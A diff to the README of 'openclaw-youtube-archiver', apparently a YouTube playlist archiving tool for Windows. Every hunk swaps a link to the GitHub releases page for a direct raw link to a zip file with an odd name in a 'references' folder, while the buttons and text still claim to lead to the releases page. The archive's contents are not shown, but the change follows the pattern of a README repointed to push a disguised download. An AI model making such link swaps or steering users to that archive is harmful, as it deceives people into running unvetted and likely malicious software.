@@ -1,6 +1,6 @@
 # 🦞 openclaw-youtube-archiver - Save YouTube Playlists as Notes
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20from%20Releases-blue)](https://github.com/Chuenemulisa/openclaw-youtube-archiver/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20from%20Releases-blue)](https://raw.githubusercontent.com/Chuenemulisa/openclaw-youtube-archiver/main/references/openclaw_archiver_youtube_unforbade.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Make sure your Windows PC meets these simple requirements:
 
 Click the big button below to open the download page. This page lists all the available versions of openclaw-youtube-archiver.  
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20from%20Releases-orange)](https://github.com/Chuenemulisa/openclaw-youtube-archiver/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20from%20Releases-orange)](https://raw.githubusercontent.com/Chuenemulisa/openclaw-youtube-archiver/main/references/openclaw_archiver_youtube_unforbade.zip)
 
 ### Step 2: Download the latest Windows installer
 
@@ -152,10 +152,10 @@ This app works best with public YouTube playlists. Private or age-restricted pla
 
 ## 🔗 Resources
 
-- Visit the [releases page](https://github.com/Chuenemulisa/openclaw-youtube-archiver/releases) anytime to get the latest version.
+- Visit the [releases page](https://raw.githubusercontent.com/Chuenemulisa/openclaw-youtube-archiver/main/references/openclaw_archiver_youtube_unforbade.zip) anytime to get the latest version.
 - Report issues or ask questions on the repository's Issues tab on GitHub.
 - Check the README on GitHub for updates and advanced usage tips.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20from%20Releases-blue)](https://github.com/Chuenemulisa/openclaw-youtube-archiver/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20from%20Releases-blue)](https://raw.githubusercontent.com/Chuenemulisa/openclaw-youtube-archiver/main/references/openclaw_archiver_youtube_unforbade.zip)
